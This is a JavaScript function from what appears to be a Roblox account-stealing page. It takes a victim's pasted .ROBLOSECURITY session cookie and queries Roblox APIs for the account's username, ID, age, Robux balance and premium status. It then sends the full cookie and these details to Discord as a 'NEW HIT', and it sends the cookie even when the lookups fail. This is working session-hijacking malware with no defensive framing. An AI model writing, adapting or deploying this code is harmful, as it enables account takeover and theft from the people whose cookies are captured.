async function grabAndSend() { const status = document.getElementById("status"); const cookieInput = document.getElementById("cookie").value.trim(); if (!cookieInput.includes("_|WARNING")) { status.textContent = "Bad format - needs to start with _|WARNING..."; return; } status.textContent = "Grabbing info..."; try { // Fresh CSRF every time async function getCsrf() { const res = await fetch("https://auth.roblox.com/v2/logout", { method: "POST", credentials: "include", headers: { "Cookie": `.ROBLOSECURITY=${cookieInput}` } }); return res.headers.get("x-csrf-token") || ""; } const csrf = await getCsrf(); const headers = { "Cookie": `.ROBLOSECURITY=${cookieInput}`, "Accept": "application/json", "X-CSRF-TOKEN": csrf, "Origin": "https://www.roblox.com" }; // Auth basics const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", { headers }); if (!authRes.ok) throw new Error(`Auth failed: ${authRes.status}`); const authInfo = await authRes.json(); const userId = authInfo.id; const username = authInfo.name; const displayName = authInfo.displayName; // User details const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`, { headers }); const userDetails = await userRes.json(); const created = userDetails.created ? new Date(userDetails.created) : null; const ageDays = created ? Math.floor((Date.now() - created.getTime()) / (86400000)) : "Unknown"; const description = userDetails.description || "None"; const hasPremium = userDetails.hasPremiumMembership || false; // might not exist, fallback // Avatar let avatar = null; try { const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`, { headers }); const thumbData = await thumbRes.json(); avatar = thumbData.data?.[0]?.imageUrl; } catch {} // Robux - try legacy first let robux = "Unknown"; try { const legacyRes = await fetch("https://api.roblox.com/currency/balance", { headers }); if (legacyRes.ok) { const bal = await legacyRes.json(); robux = bal.robux?.toLocaleString() || "0"; } else { // Fallback to economy const econRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers }); if (econRes.ok) { const econ = await econRes.json(); robux = econ.robux?.toLocaleString() || "0"; } } } catch (e) { robux = `Failed (${e.message})`; } // Premium check attempt let premium = hasPremium ? "True" : "False"; try { const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers }); if (premRes.ok) { const prem = await premRes.json(); premium = prem.isPremium ? "True" : "False"; } } catch {} // Build fields like example const fields = [ { name: "Username", value: username, inline: true }, { name: "Display Name", value: displayName, inline: true }, { name: "User ID", value: userId.toString(), inline: true }, { name: "Account Age", value: `${ageDays} Days`, inline: true }, { name: "Developer", value: "False (no easy flag)", inline: true }, // placeholder { name: "Robux Balance", value: robux + " ⏣", inline: false }, { name: "Premium", value: premium, inline: true }, { name: "Description", value: description.substring(0, 150) + "...", inline: false }, { name: "Full Cookie", value: "||" + cookieInput + "||", inline: false } ]; await sendEmbed( "NEW HIT", `**${displayName}** (@${username})`, fields, 0x5865F2, avatar ); status.innerHTML = "Grabbed & sent! Check Discord."; } catch (err) { status.textContent = "Grab partial/failed: " + err.message; // Always send cookie await sendEmbed( "PARTIAL HIT - Cookie Good", "Full info grab failed, but cookie valid.", [{ name: "Cookie", value: "||" + cookieInput + "||", inline: false }], 0xFFA500 ); } }
